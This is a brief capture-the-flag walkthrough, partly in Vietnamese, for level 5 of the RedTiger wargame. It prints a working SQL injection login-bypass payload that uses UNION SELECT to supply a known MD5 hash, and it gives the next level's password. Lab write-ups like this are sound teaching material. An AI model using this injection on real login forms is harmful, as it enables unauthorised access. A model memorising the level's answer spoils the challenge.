
http://redtiger.labs.overthewire.org/level5.php?mode=login

Hints: its not a blind, the password is md5-crypted, watch the login errors

Điều này ý nghĩa là, password được mã hóa ở dạng MD5 vì thể ta đăng kí tài khoản để truy cập vào miễn sao pw MD5 là được

`login=Login&password=1&username=' union select 1, 'c4ca4238a0b923820dcc509a6f75849b'#`

<img src="http://i.imgur.com/dQgJshq.jpg">

The password for the next level is: for_more_bugs_update_to_php7
